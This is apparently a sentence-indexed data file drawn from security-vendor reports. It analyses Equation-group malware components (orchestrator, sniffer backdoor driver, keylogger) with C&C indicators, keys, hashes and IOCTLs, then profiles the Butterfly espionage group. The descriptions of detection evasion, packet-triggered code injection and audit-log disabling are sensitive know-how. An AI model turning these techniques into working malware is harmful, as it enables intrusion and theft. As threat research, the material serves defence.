"982": "We assume that the \" Debug \" version of the code does n't suppress error popups when exception occurs as this helps with the debugging of the code .", "983": "The list of OS versions that pass this test .", "984": "If the module is NOT running on WinNT6.0 + , it then attempts to open a virtual device file with one of the following names .", "985": "If the device file is successfully opened , the module activates a rootkit for its process and for the file location \" % SYSTEM%\\unilay.dll \" local path .", "986": "This is followed by finding and terminating a process named \" winproc.exe \" which is the name of another component of the platform .", "987": "Note that this part of the code is executed only on platforms different from WinNT 6.x ( Windows Vista and later ) .", "988": "The module was designed to fetch or update its main configuration data from different places .", "989": "There are some default values set inside the code , such as some timeout values and the following C&Cs .", "990": "These default values can be overwritten later .", "991": "Next , it locates a data section called \" Share2 \" in the current module and verifies the starting magic number .", "992": "If it is 0x63959700 , it then decrypts the rest of the data in the section and interprets it as a configuration block .", "993": "However , data from the next location can override all previous settings .", "994": "This is a registry value with special name .", "995": "The naming of the registry location is the same GUID - like SHA1 value as the one used in the loader ( \" mscfg32.exe \" ) , and is produced from the source string \" Configuration \" .", "996": "[ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] { 42E14DD3- F07A-78F1 - 7659 - 26AE141569AC - E0B3EE89 } The configuration block stored in the registry value is encrypted using RC5 with the 1024-bit key .", "997": "Both the loader and the orchestrator share the same key for encrypting and decrypting the registry values in the \" MemSubSys \" key .", "998": "The decrypted configuration block consists of a series of tagged configuration records in the following format .", "999": "[ RecordType : DWORD][RecordSize : DWORD][RecordValue : % RecordSize% ] We retrieved a copy of a configuration block and decrypted and partly interpreted it .", "1000": "We are including the results for one of the configuration blocks .", "1001": "Time value : 1 year 0 months 1 days 22 hours 6 mins 52 secs .", "1002": "The orchestrator is expected to set this field to the time of initial configuration .", "1003": "Binaries : 3x1024-bit encryption keys 1b8e7818dad6345c53c2707a2c44648eee700d5cf34fea6a19a3fa0a6a871c72963fdded 91e2703c82b7747b8793e3063700da32cfb8d907dcce1beb36edd575418d1134ef188b 27ec3ce23711a656b0a8bf28921fbf1c39b4c90ad561e4174ed90f26ce11245bb9deb4b 4720403f47ca865ec8bbd3c1df9d93d042ff5b52ec6 05000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000 ed04953f3452068ae6439f04c7904c8be5e98e66e2cd0f267d65240aeed88bd4d3c6105 c99950dd42ccde4bc6bbaf9f6cb1b4e628d943e91f8f97f2aff705fdd25e3af6ba0bc4fd13 d67a2bcb751bb8f21f3d4b66c599f3e572802911394d142f8cf3a299d6d4558f9f0f01634 9afd1888472f4f8c729ffe913f670931f1a227 C&C domain : www[dot]waeservices[dot]com C&C IP address : 213.198.79.49 C&C port : 443 Timestamp : 2010 - 12 - 08 11:35:57 Tool Reference : VTT/82055898/STEALTHFIGHTER/ 2008 - 10 - 16/14:59:06.229 - 04:00 TimeoutA : 25200 sec ( 7 hours ) TimeoutB : 32400 sec ( 9 hours ) TimeoutC : 3600 sec ( 1 hour ) TimeoutD : 172800 sec ( 48 hours ) + Several Unknown Values Other configuration blocks we discovered contained similar information , with only some unique values .", "1004": "Timestamp : 2009 - 11 - 23 14:10:15 Tool Reference : Manual / DRINKPARSLEY/2008 - 09 - 30/10:06:46.468 - 04:00 Tool Reference : VTT/82053737/STRAITACID/2008 - 09 - 03/10:44:56.361 - 04:00 Tool Reference : STRAITSHOOTER30.ex _ Tool Reference : VTT/82051410/LUTEUSOBSTOS/2008 - 07 - 30/17:27:23.715 - 04:00 Tool Reference : BACKSNARF_AB25 During the next step , the module obtains PE file version information from the resource section .", "1005": "It loads the version info using hard - coded module names , which are supposed to match the current module name .", "1006": "SVCHOST32.DLL for Windows 9x MSCFG32.DLL for Windows NT If file version information is available , it gets language - specific values of the PrivateBuild block .", "1007": "The codepage and languages that are verified : Unicode , LANG_NEUTRAL and LANG_ENGLISH_US .", "1008": "When this check passes , the module gets @default registry value from the following location .", "1009": "[ HKLM\\SOFTWARE\\Classes\\CLSID\\{091FD378 - 422D - A36E-8487 - 83B57ADD2109 } ] TypeLib If the key is not found , the code checks for registry value TypeLib in the following key : [ HKLM\\SOFTWARE\\Classes\\CLSID\\{091FD378 - 422D - A36E-8487 - 83B57ADD2109 } ] If such a value is found , it is then deleted along with the Version value if it exists in the same key .", "1010": "The string obtained from one of two possible registry values is processed as if this value is a CLSID - like string : the code takes the last 16 hexadecimal digits , splits them in two 8-chars values , converts them to binary form ( two DWORDs ) and reverses the order of bytes in each DWORD and XORs , the first value with 0x8ED400C0 , and the second with 0x4FC2C17B.", "1011": "Next , the first DWORD value becomes second and the second becomes first .", "1012": "In this order , they are stored in a structure in memory .", "1013": "These two values seem to be very important as they override a few values in the previously known configuration .", "1014": "If they do n't exist , values from the current configuration replace them and are stored back in the registry following the reverse procedure .", "1015": "We collected and decrypted several samples of such values .", "1016": "According to the code , they are initialized with values of the Microsoft filetime format .", "1017": "So , we decided to interpret them as filetime values .", "1018": "20101C04EC2C17B : 1 year(s ) 7 month(s ) 21 day(s ) 23 hour(s ) 32 min(s ) 1 sec(s ) 81E01C04EC2C17B : 1 year(s ) 7 month(s ) 8 day(s ) 12 hour(s ) 13 min(s ) 5 sec(s ) E0001C04EC2C17B : 1 year(s ) 7 month(s ) 21 day(s ) 1 hour(s ) 6 min(s ) 15 sec(s ) 77101C04EC2C17B : 1 year(s ) 5 month(s ) 20 day(s ) 19 hour(s ) 15 min(s ) 4 sec(s ) 30F01C04EC2C17B : 1 year(s ) 8 month(s ) 0 day(s ) 6 hour(s ) 10 min(s ) 33 sec(s ) C0901C04EC2C17B : 1 year(s ) 8 month(s ) 2 day(s ) 6 hour(s ) 29 min(s ) 39 sec(s ) 66701C04EC2C17B : 1 year(s ) 6 month(s ) 9 day(s ) 2 hour(s ) 10 min(s ) 23 sec(s ) F6501C04EC2C17B : 1 year(s ) 6 month(s ) 6 day(s ) 19 hour(s ) 53 min(s ) 22 sec(s ) 01401C04EC2C17B : 1 year(s ) 6 month(s ) 25 day(s ) 23 hour(s ) 34 min(s ) 13 sec(s ) After that , the module stores current time values in encrypted form in the registry value .", "1019": "[ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] { 08DAB849 - 0E1E- A1F0-DCF1 - 457081E091DB-117DB663 } ( encoded SHA1 of \" StartTime \" ) The module contains an additional compressed Windows DLL file in the resource section , which is extracted as \" unilay.dll \" ( see below ) .", "1020": "This DLL exports a number of functions that are just wrappers of the system API used to work with files and the registry , and also start processes and load additional DLL files .", "1021": "The orchestrator contains several built - in plugins that form the core of the platform .", "1022": "These are initialized in the first place , and then additional plugins are loaded .", "1023": "All the plugins are indexed in a single encrypted registry value .", "1024": "[ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] 1 This value has information about all the components of the current kit .", "1025": "It may include Unicode strings with paths to extra DLLs which serve as plugins .", "1026": "Each DLL exports at least four functions which are imported by ordinal numbers from 1 to 4 .", "1027": "The structure of the registry value \" 1 \" .", "1028": "[ Count : DWORD ] { [ Plugin Id : WORD][Plugin Path Length : DWORD][Plugin Path String : VARIABLE ] } Plugins interact with each other and with the orchestrator by exchanging messages of pre - defined format .", "1029": "The message transport is implemented as a global object that contains four communication streams .", "1030": "Every stream contains a pair of kernel synchronization object handles ( a semaphore with fixed maximum value defaulted to 1000 and a mutex ) and a message queue as an array .", "1031": "A dedicated thread processes messages that appear in the message queues .", "1032": "A message arrives in a parcel , represented as two DWORD values that contain the size of the message and a pointer to the message data .", "1033": "The message data starts with a DWORD identifying a class of message ( a request , reply , etc ) .", "1034": "The orchestrator contains the following built - in plugins ( listed by internal ID ) : 8000 , 8022 , 8024 , 803C , 8046 , 800A , 8042 , 8002 , 8004 , 8006 , 8008 , 8070 , 808E.", "1035": "Several additional built - in modules have been discovered in newer versions of the orchestrator that was shipped with the GrayFish platform .", "1036": "It redirects Unicode ( \" W \" ) variants of Windows API functions to corresponding ANSI variants by converting Unicode string parameters to multi - byte strings and calling the respective ANSI API .", "1037": "MD5 EF4405930E6071AE1F7F6FA7D4F3397D Size 9 728 bytes Compiled 2008.01.23 14:23:10 ( GMT ) Format PE32 DLL , linker version 6.0 ( Microsoft Visual C++ 6.0 ) Exported functions ( redirected to ANSI variants ) .", "1038": "100017EF : CopyFileW 10001039 : CreateDirectoryW 10001111 : CreateFileW 100011B3 : CreateProcessW 10001177 : DeleteFileW 10001516 : FindFirstChangeNotificationW 10001466 : FindFirstFileExW 10001300 : FindFirstFileW 100014C6 : FindNextFileW 10001564 : GetCurrentDirectoryW 1000188F : GetFileAttributesW 100016C6 : GetStartupInfoW 10001602 : GetSystemDirectoryW 10001664 : GetWindowsDirectoryW 10001853 : LoadLibraryW 1000178B : MoveFileExW 1000172D : MoveFileW 10001913 : RegCreateKeyExW 100019F5 : RegDeleteKeyW 10001DDF : RegDeleteValueW 10001A39 : RegEnumKeyExW 10001BE2 : RegEnumValueW 1000199B : RegOpenKeyExW 10001B23 : RegQueryInfoKeyW 10001D57 : RegSetValueExW 100010D5 : RemoveDirectoryW 10001E81 : SHGetFileInfoW 100015C6 : SetCurrentDirectoryW 100018CB : SetFileAttributesW 10001E23 : lstrcmpW Network - sniffer / patcher - atmdkdrv.sys MD5s 8d87a1845122bf090b3d8656dc9d60a8 214f7a2c95bdc265888fbcd24e3587da Size 41 440 , 43 840 bytes Format PE32 Native Compiled 2009.04.16 17:19:30 ( GMT ) 2008.05.07 19:55:14 ( GMT ) Version Info FileDescription : Network Services LegalCopyright : Copyright ( C ) Microsoft Corp.", "1039": "1981 - 2000 InternalName : atmdkdrv.sys FileDescription : CineMaster C 1.1 WDM Main Driver LegalCopyright : Copyright 1999 RAVISENT Technologies Inc.", "1040": "Its first word is set to 0x21 at the beginning of the DriverEntry function , and is replaced with 0x20 at the end of DriverEntry .", "1041": "This driver appears to have been put together in \" quick - and - dirty hack \" style , using parts of the \" mstcp32.sys \" sniffer and other unknown drivers .", "1042": "It contains a lot of unused code which is partially broken or disabled .", "1043": "These include a broken \" Dynamically disable / enable windows audit logging \" subsystem and an incomplete \" Patcher mode \" .", "1044": "There are three algorithms used for strings encryption - RC5 ; alphabet encryption like the one used in \" mstcp32.sys \" ; and XOR with a pre - seeded random number generator .", "1045": "Decrypted strings are immediately encrypted back until the next usage to avoid in - memory detection .", "1046": "The driver 's filename and device name differ across the samples .", "1047": "They depend on the name of the registry key that is used to start the driver .", "1048": "The driver may operate in one of two independent modes - as a network sniffer or as a memory patcher .", "1049": "The mode of operation is selected on startup , based on the \" Config2 \" value of the driver 's registry key .", "1050": "By default the driver starts in \" sniffer mode \" .", "1051": "It captures only directed packets ( containing a destination address equal to the station address of the NIC ) .", "1052": "Packers - filtering engine rules may be set via DeviceIoControl messages .", "1053": "Filtered packets are stored in - memory until requested .", "1054": "Maximum packets storage list length is 128 items per filtering rule .", "1055": "Almost broken , it does nothing interesting except , possibly , replace the thread 's ServiceTable to an unchanged , clear copy taken from the on - disk image of \" ntoskrnl.exe \" .", "1056": "Sniffer only IOCTLs : 44038004 - add filtering rule 44038008 - clear stored packet in specified filtering rules list 4403800C - enable specified filtering rule 44038010 - disable specified filtering rule 44038014 - get stored packet from specified filtering rules list 44038018 - process packet like the one received from the wire ( filter and store ) 4403801C - set maximum rules list length 44038020 - get maximum rules list length 80000004 - enablePacketsFiltering 80000008 - disablePacketsFiltering ( PauseSniffer ) 800024B4 - send packet to the specified network interface Common IOCTLs : 80000028 - do nothing ( broken / unused part ) 80000038 - set external object ( broken / unused part ) 8000003C - get 4 dwords struct ( broken / unused part ) 80000040 - copy 260 bytes from the request ( broken / unused part ) 80000320 - set I / O port mapping ( broken / unused part ) 80000324 - clear I / O port mapping ( broken / unused part ) 80000328 - set external PnP Event ( broken / unused part ) 80000640 - replace specified thread 's SDT ( ETHREAD.ServiceTable field ) to a given copy Backdoor driven by network sniffer - \" mstcp32.sys \" , \" fat32.sys \" MD5s 74DE13B5EA68B3DA24ADDC009F84BAEE B2C7339E87C932C491E34CDCD99FEB07 311D4923909E07D5C703235D83BF4479 21C278C88D8F6FAEA64250DF3BFFD7C6 Size 57 328 - 57 760 bytes Format PE32 Native Compiled 2007.10.02 12:42:14 ( GMT ) 2001.08.17 20:52:04 ( GMT ) Version Info FileDescription : TCP / IP driver LegalCopyright : Copyright ( C ) Microsoft Corp.", "1057": "1981 - 1999 InternalName : mstcp32.sys This is a sniffer tool similar to \" tdip.sys \" and it uses NT4 NDIS-4 , XP NDIS-5 interfaces .", "1058": "It targets incoming traffic on Ethernet and VPN ( ndiswanip ) interfaces , but instead of dumb packet dumping , it uses received packets as commands for the \" process injector \" subsystem that is able to extract and execute code from the specially crafted network packets .", "1059": "Default filtering rules are stored in the \" Options \" registry value of the driver 's registry key .", "1060": "It captures only directed packets ( containing a destination address equal to the station address of the NIC ) .", "1061": "The driver 's filename and device name differ across the samples .", "1062": "They depend on the name of the registry key that is used to start the driver .", "1063": "The code - builder within this module facilitates exploitation by providing up to four predefined execution templates , which seem to be suitable for generating several code patterns .", "1064": "Below is a list of the execution templates we found : locate a DLL via PEB structure and resolve exports call single function call four functions call six functions Using these as a base for the templates , the code - builder inserts parameters and proper offsets to call one of the following code patterns .", "1065": "Locate and call WinExec Locate and call LoadLibraryW , GetProcAddress , call exported procedure , FreeLibrary Locate and call LoadLibraryW , GetProcAddress , call GetModuleHandle , FreeLibrary Locate and call OpenProcess , VirtualAllocEx , WriteProcessMemory , CreateRemoteThread , VirtualFreeEx , CloseHandle The code injection procedure allocates memory via ZwAllocateVirtualMemory in services.exe and copies implanted code .", "1066": "After that it uses KeInsertQueueApc to let the code run and waits 30 seconds for APC to complete .", "1067": "This value may contain a list of process names that should be started by injected executable code but only after services.exe and winlogon.exe has been started .", "1068": "During the injection stage Windows Audit Logging is fully disabled to avoid leaving any suspicious records in Windows Logs .", "1069": "All incoming packets are first filtered by BPF - like rules .", "1070": "The filtering rules are located in [ HKLM\\System \\CurrentControlSet\\Services\\%driver name% ] Options registry value or passed via corresponding IOCTL .", "1071": "Packets that passed through the filter are added in the end of processing queue .", "1072": "Packets from the queue must have valid checksum values .", "1073": "After checking that , the code XOR - decrypts additional data from the end of the packet .", "1074": "The decrypted end of the packet contains another control structure that defines which encryption algorithm is used to decipher packet body .", "1075": "Supported algorithms include RC5 and RSA .", "1076": "There is a 1024-bits RSA public key hardcoded inside the module body , while a 96-bits RC5 key is generated dynamically .", "1077": "The backdoor command may arrive in a single packet or be split into pieces and come with several packets .", "1078": "There is a procedure for re - assembling pieces together : a multi - packet command is added to a special packet collector which puts all the pieces together before passing it further .", "1079": "Backdoor command is stored in the first byte of the decrypted request and can be one of the following values .", "1080": "Note : \" mstcp32 \" is mentioned together with rootkit - like behavior in 2004 here : http://www.pcreview.co.uk /forums / mstcp32-t1445152.html[21 ] Network Sniffer - tdip.sys MD5s 20506375665a6a62f7d9dd22d1cc9870 60dab5bb319281747c5863b44c5ac60d Size 22448 - 28800 bytes Format PE32 Native Compiled 2006.10.16 18:42:40 ( GMT ) 2003.08.17 21:47:33 ( GMT ) Supports the following versions of Windows : NT4 using NDIS-4 and XP using NDIS-5 .", "1081": "Does n't use Vista and later NDIS-6 features .", "1082": "However , later NDIS versions are backward - compatible , so the driver is still valid for current versions of Windows .", "1083": "Version Info : FileDescription : IP Transport Driver LegalCopyright : Microsoft Corporation .", "1084": "All rights reserved .", "1085": "It implements a BPF ( Berkeley packet filter ) style packet - filtering system that is configured from the driver 's registry configuration values or from DeviceIoControl messages .", "1086": "The captured network packets may be written to disk in libpcap format ( magic 0xA1B2C3D4 version 2.4 ) and encrypted with one - byte XOR , key 0xE3 .", "1087": "The driver 's configuration is stored in the registry key : [ HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\tdip ] Options - packet filtering rules in BPF format Tag - selector of filtered packet types / Defaults in case of MediumWan to NDIS_PACKET_TYPE_BROADCAST|NDIS_PACKET_TYPE_MULTICAST|NDIS_PACKET_TYPE_DIRECTED ; ( or NDIS_PACKET_TYPE_BROADCAST|NDIS_PACKET_TYPE_DIRECTED in any other case ) ImageFile - full path name to the resulting pcap file Duration - used as Length of the original packet in dump file .", "1088": "( default 0xffff ) Backup - max size of the pcap file IOCTLs : 0x80002004 getCurrentState 0x80002008 setFilteringRules 0x8000200C getFilteringRules 0x80002024 getDumpFileSize 0x80002010/0x80002014/0x80002018/0x8000201C pause / resume 0x80002020 getVersion - returns 2.4.0 Driver has three logical parts , and uses an incomplete function pointer table as interface .", "1089": "The code is of very good quality .", "1090": "It looks more complicated than Winpcap 2.3 ( released 28 mar 2002 ) , but less so than Winpcap 3.0 ( released by 10 apr 2003 ) .", "1091": "Interestingly , the driver identifies itself as \" version 2.4 \" in the pcap file despite there being no Winpcap version 2.4 .", "1092": "Key / clipboard logger driver - msrtvd.sys MD5s 98dea1bce37bf7087360e1958400589b bb8f56874189d5dfe9294f0553a49b83 f6bf3ed3bcd466e5fd1cbaf6ba658716 Size 31 488 - 36 736 bytes Format PE32 Native Compiled 2010.02.19 22:45:18 ( GMT ) 2008.09.17 16:23:54 ( GMT ) Version Info FileDescription : MSRTvd interface driver LegalCopyright : Microsoft Corporation .", "1093": "All rights reserved .", "1094": "On startup , the driver creates a device named \" \\Device\\Gk0 \" and a symbolic link named \" \\DosDevices\\Gk \" .", "1095": "Then it attaches to the csrss.exe process and disassembles user32.dll and ntdll.dll routines to obtain win32k.sys and ntoskrnl.exe SDT services indexes and pointers of needed Nt / Zw APIs .", "1096": "Then , using a built - in disassembler , it obtains pointers to NtUserPeekMessage , NtUserGetMessage , NtUserGetClipboardData and using the disassembler again selects the parts of the code that will be then hooked by splicing .", "1097": "The interceptor routines are copied from a special PE section named \" .msda \" .", "1098": "IOCTLs : 0x22002C -start dumper thread 0x220030 - stop dumper thread 0x220034 - check if the driver has new data to dump 0x220038 - set two external events signaled on dump data availability ( it references a plugin possibility ) 0x22003C - restart dumper thread 0x220040 - get size of available data Collector plugin for Volrec - msrstd.sys MD5s 69e7943f3d48233de4a39a924c59ed2c 15d39578460e878dd89e8911180494ff Size 13 696 - 17 408 bytes Format PE32 Native Compiled 2009.06.05 16:21:55 ( GMT ) 2009.12.15 16:33:52 ( GMT ) Version Info FileDescription : msrstd driver LegalCopyright : Microsoft Corporation .", "1099": "All rights reserved .", "1100": "InternalName : msrstd.sys This driver is a plugin that collects events from the \" volrec.sys \" driver , and delivers them by sending DeviceIoControl messages .", "1101": "It collects events about file and disk volume operations .", "1102": "On startup the driver obtains a pointer to \" \\Device\\volrec \" , then creates a control device \" \\Device \\msrstd0 \" and a symbolic link to it named \" \\DosDevices\\msrstd \" All strings inside the driver are encrypted by XOR with a pre - seeded random number generator .", "1103": "For file events the driver collects the filenames , and caches data about read and write operations .", "1104": "For disk volume events it queries disk properties and reads volume labels and disk serial numbers of removable drives ( USB , FireWire drives ) .", "1105": "IOCTLs .", "1106": "0x220004 - turn on VolumeEvents collection 0x220008 - turn off VolumeEvents collection 0x22000C - retrieve previously stored VolumeEvent ( operationType , deviceTypeFlags , VolumeLabel , volumeSerialNumber , DosDriveLetter ) 0x220010 - turn on FileEvents collection 0x220014 - turn off FileEvents collection 0x220018 - retrieve previously stored FileEvent ( fileName , deviceTypeFlags , VolumeLabel , volumeSerialNumber , DosDriveLetter ) 0x22001C - connect to Volrec.sys ( send ioctl 0x220004 ) , enable plugin operation 0x220020 - disconnect from Volrec.sys ( send ioctl 0x220008 ) , disable plugin operation Filesystem filter driver \u2013 volrec.sys , scsi2mgr.sys MD5s a6662b8ebca61ca09ce89e1e4f43665d c17e16a54916d3838f63d208ebab9879 Size 14 464 - 14 848 byres Format PE32 Native Compiled 2009.06.05 16:21:57 ( GMT ) 2009.12.15 16:33:57 ( GMT ) Version Info FileDescription : Volume recognizer driver LegalCopyright : Microsoft Corporation .", "1107": "All rights reserved .", "1108": "InternalName : volrec.sys This driver is a generic filesystem filter which feeds system events to user - mode plugins .", "1109": "On startup the driver creates a control device named \" \\Device\\volrec \" and a symbolic link to it named \" \\DosDevices\\volrec0 \" .", "1110": "It then attaches all available filesystem devices .", "1111": "It is also , able to handle removable storage devices .", "1112": "All strings inside the driver are encrypted by XOR with a pre - seeded random number generator .", "1113": "IOCTLs : 0x220004 - setup plugin interface 0x220008 - disable plugin calls The driver handles the following system events : file opened , created or closed data is read or written to a file new volume is mounted , unmounted new USB or FireWire device attached HDD / SSD operation helper driver - WIN32M.SYS MD5s 2b444ac5209a8b4140dd6b747a996653 b3487fdd1efd2d1ea1550fef5b749037 Size 19 456 - 26 631 bytes Format PE32 Native , PE32 + Native Compiled 2001.08.23 17:03:19 ( GMT ) 2013.05.14 15:58:36 ( GMT ) Description This module will be the subject of a dedicated blogpost .", "1114": "HDD / SSD firmware operation - nls_933w.dll MD5s 11fb08b9126cdb4668b3f5135cf7a6c5 9f3f6f46c67d3fad2479963361cf118b Size 212 480 - 310 272 bytes Format PE32 DLL , PE32 + DLL Compiled 2010.06.15 16:23:37 ( GMT ) 2013.05.14 16:12:35 ( GMT ) Version Info FileDescription : Windows Networking Library ( 64bit dll only ) LegalCopyright : Copyright ( C ) Microsoft Corp.", "1115": "1981 - 2001 FileVersion : 80AA InternalName : nls_933w.dll OriginalFilename : nls_933w.dll PrivateBuild : 4.0.1.0 ProductName : Microsoft(R ) Windows ( R ) 2000 Operating System ProductVersion : 5.0.2074.0 Full Version : 1.0.0.1 Description This ( 80AA ) plugin is a HDD firmware fiashing tool which includes an API and the ability to read / write arbitrary information into hidden sectors on the disk .", "1116": "The plugin will be the subject of a separate blogpost .", "1117": "Butterfly * is a group of highly capable , professional attackers who perform corporate espionage with a laser - like focus on operational security .", "1118": "The team is a major threat to organizations that have large volumes of proprietary intellectual property , all of which is at risk of being stolen by this group for monetary gain .", "1119": "The Butterfly attackers , who Symantec believes are a small number of technically capable individuals , compromised several major technology companies including Twitter , Facebook , Apple and Microsoft in early 2013 .", "1120": "In these campaigns , the attackers used a Java zero - day exploit to drop malware onto victims ' computers .", "1121": "Since those attacks , there has been little - to - no public information about the Butterfly attackers .", "1122": "Symantec has been working with victims to track these attackers over the past two years .", "1123": "We found that Butterfly compromised multiple pharmaceutical companies , technology firms , law practices , and oil and precious metal mining organizations during this period .", "1124": "The attackers are versatile and spread their threats quickly within compromised organizations .", "1125": "They may also have had access to at least one other zero - day exploit , affecting Internet Explorer 10 .", "1126": "There are some indications that this group may be made up of native English speakers , are familiar with Western culture , and may operate from an Eastern Standard Time ( EST ) time zone .", "1127": "Prior to Butterfly , the majority of documented cyberespionage attacks has been conducted against politically sensitive entities such as embassies , government ministries , central banks , dissidents , militaries , and associated defense contractors .", "1128": "Government - sponsored attackers have also attacked private sector organizations , presumably to steal intellectual property in order to provide their local industry with an unfair advantage in the market .", "1129": "Butterfly is a timely reminder to organizations that as well as defending against state - sponsored attacks , organizations must be aware of the potential threat of corporate espionage , where attacks are performed at the behest of competitors or by individuals looking to monetize stolen information such as through stock trading using insider knowledge .", "1130": "A key difference between attacks coming from competitors and state- sponsored attackers is that competitors are likely in a better position to request the theft of specific information of value and make more rapid use of this information than government - sponsored attackers would .", "1131": "Butterfly appears to be part of this class of attack group .", "1132": "The attackers appear to be motivated by financial gain , either by using the information themselves for their own benefit or selling it to a third party .", "1133": "* \" Morpho \" was used in the original publication to refer to this attack group .", "1134": "Symantec has renamed the group \" Butterfly \" to avoid any link whatsoever to other legitimate corporate entities named \" Morpho \" .", "1135": "The attackers appear to be motivated by financial gain , either by using the information themselves for their own benefit or selling it to a third party .", "1136": "The corporate espionage threat Prior to Butterfly , the majority of documented cyberespionage attacks has been conducted against politically sensitive entities such as embassies , government ministries , central banks , dissidents , militaries , and associated defense contractors .", "1137": "Government - sponsored attackers have also attacked private sector organizations , presumably to steal intellectual property in order to provide their local industry with an unfair advantage in the market .", "1138": "Butterfly is a timely reminder to organizations that as well as defending against state - sponsored attacks , organizations must be aware of the potential threat of corporate espionage , where attacks are performed at the behest of competitors or by individuals looking to monetize stolen information such as through stock trading using insider knowledge .", "1139": "A key difference between attacks coming from competitors and state - sponsored attackers is that competitors are likely in a better position to request the theft of specific information of value and make more rapid use of this information than government - sponsored attackers would .", "1140": "Butterfly appears to be part of this class of attack group .", "1141": "The attackers appear to be motivated by financial gain , either by using the information themselves for their own benefit or selling it to a third party .", "1142": "Butterfly attacks against tech firms On February 1 , 2013 , Twitter published a blog , stating that it had \" discovered one live attack \" and added that it was \" able to shut it down in process moments later . \" Twitter encouraged users \" to disable Java \" in their browsers .", "1143": "\" The attackers were extremely sophisticated , and we believe other companies and organizations have also been recently similarly attacked , \" said Twitter .", "1144": "Fourteen days later , on February 15 , Facebook issued a statement , disclosing that several of its systems \" had been targeted in a sophisticated attack . \" Facebook said that the attackers used \" a ' zero - day ' ( previously unseen ) exploit to bypass the Java sandbox , \" which had been hosted on a \" mobile developer website that was compromised . \" Reuters referenced a similar statement from Apple a few days later on February 19 .", "1145": "According to Apple , attackers used a Java zero - day exploit to compromise a number of Apple employees ' Mac OS X computers .", "1146": "Apple said that the exploit was delivered through a \" site aimed at iPhone developers . \" Finally , Microsoft published a statement on February 22 , stating that it too had \" experienced a similar security intrusion \" as the ones reported by Facebook and Apple .", "1147": "The attacks against these technology firms appeared to take place between 2012 and early 2013 .", "1148": "The zero - day exploit referred to in the various statements took advantage of the Oracle Java Runtime Environment Multiple Remote Code Execution Vulnerabilities ( CVE-2013 - 0422 ) .", "1149": "The vulnerability had been patched by Oracle on January 13 , 2013 , after the attacks occurred .", "1150": "Various parties published details of the attack vector , as well as the malware used in the attacks , several days later .", "1151": "F - Secure blogged that a Mac OS X back door ( detected by Symantec as OSX.Pintsized ) was the attack 's payload .", "1152": "According to the website StopMalvertising , the compromised website that hosted the exploit was an iPhone developer website called iPhoneDevSDK.com .", "1153": "Independent researcher Eric Romang published some technical details about the attacks and established a timeline suggesting that the attackers have been active from September 2012 .", "1154": "Symantec telemetry indicates that the timeline goes back even further than this , with malicious activity starting from at least April 2012 .", "1155": "Romang analyzed many of the OSX.Pintsized samples and also identified a Windows back door , which he claimed was related to the attacks .", "1156": "This Windows file is a variant of what Symantec detects as Backdoor . Jiripbot .", "1157": "Other vendors called the variant Jripbot .", "1158": "Since Romang 's analysis , there has been little - to - no public information related to the attackers behind the Java zero - day exploit or the use of OSX.Pintsized and Backdoor . Jiripbot .", "1159": "Some victims seem to have been compromised as a result of collateral damage , as the attackers appeared uninterested in them and either cleaned up or abandoned the infection .", "1160": "After the events of late 2012 and early 2013 , the Butterfly attackers appeared to have maintained a low profile , compromising a small number of organizations .", "1161": "Each year however , that number has increased .", "1162": "Symantec has discovered that the Butterfly attackers have compromised 49 unique organizations .", "1163": "Out of the 49 organizations , 27 of the companies ' industries could be identified , while the remaining are unknown .", "1164": "Some victims seem to have been compromised as a result of collateral damage , as the attackers appeared uninterested in them and either cleaned up or abandoned the infection .", "1165": "However , other victims were clearly of value to Butterfly , as the attackers spread quickly in the networks until they found computers of interest .", "1166": "The chart in Figure 1 shows the number of infected organizations per industry over time .", "1167": "The graph is filtered to only include organizations that could be classified into a sector .", "1168": "Symantec found that there was a lull in activity following the very public documentation of the late 2012 and early 2013 attacks .", "1169": "Butterfly 's activity resumed in August 2013 , and there has been a substantial increase in the number of victims from late 2014 to the present .", "1170": "The three regions that were most heavily targeted by Butterfly since 2012 are shown in Figure 2 .", "1171": "The other regions affected by Butterfly 's attacks are .", "1172": "The industries of known victims have remained relatively consistent over time , with some notable exceptions .", "1173": "Industries The Java zero - day attack that exploited CVE-2013 - 0422 appears to have targeted technology companies , judging from the nature of the watering - hole website .", "1174": "This claim is backed up by the organizations that publicly reported how they were compromised in the attacks .", "1175": "Butterfly has continued to target a number of technology companies , which are primarily based in the US .", "1176": "Other Butterfly victims of note are involved in the pharmaceutical , legal , and commodities industries .", "1177": "The Butterfly attackers continued to attack these industries intermittently over the following two years .", "1178": "Pharmaceutical In January 2014 , a major European pharmaceutical company was compromised .", "1179": "The attackers appear to have first breached a small European office and a month later , spread across the network to the company 's US office , as well as the European headquarters .", "1180": "Two more major European pharmaceutical companies were later compromised\u2212one in September 2014 and the other in June 2015 .", "1181": "In both incidents , the attackers appear to have gained access to computers in several regional offices .", "1182": "In the June 2015 compromise , the affected company quickly identified the infection from Symantec 's alerts , as well as other notifications on Secure Shell ( SSH ) traffic on non - standard ports .", "1183": "Technology The Butterfly attackers have consistently targeted major technology companies from late 2012 to the present .", "1184": "At least five companies , in addition to those who publicly documented the attacks in 2013 , have been compromised , to Symantec 's knowledge .", "1185": "The technology companies are primarily headquartered in the US .", "1186": "Law In the watering - hole attacks of early 2012 , two US - based law firms were attacked .", "1187": "No other known legal entities were attacked until June 2015 , when the Central Asian offices of a global law firm were compromised .", "1188": "This most recent victim specializes in a number of topics , including finance and natural resources specific to the region .", "1189": "Commodities Two major natural resources organizations were compromised in late 2014 .", "1190": "These organizations specifically work with gold and oil .", "1191": "The timing of these compromises , along with the later breach of the law firm as previously mentioned , is notable .", "1192": "It seems very likely that the Butterfly attackers have a specific interest in the commodities industry and are in a position to profit from information stolen from the breached organizations .", "1193": "Government , logistics , and education A number of victims appear to have been of little interest to the attackers .", "1194": "This was the case for one Middle Eastern government agency , a Japanese logistics company , and an American university .", "1195": "With all three victims , either the attack was not successful or , if it was , the malware was not used after the initial compromise .", "1196": "It seems likely that these victims were collateral damage .", "1197": "In most organizations , these systems were email servers : either Microsoft Exchange or Lotus Domino servers .", "1198": "Other systems that the attackers compromised were enterprise content management servers .", "1199": "These systems are used for indexing and storing a company 's various documents and other digital assets .", "1200": "Such servers would not contain source code , but rather legal documents , internal policies 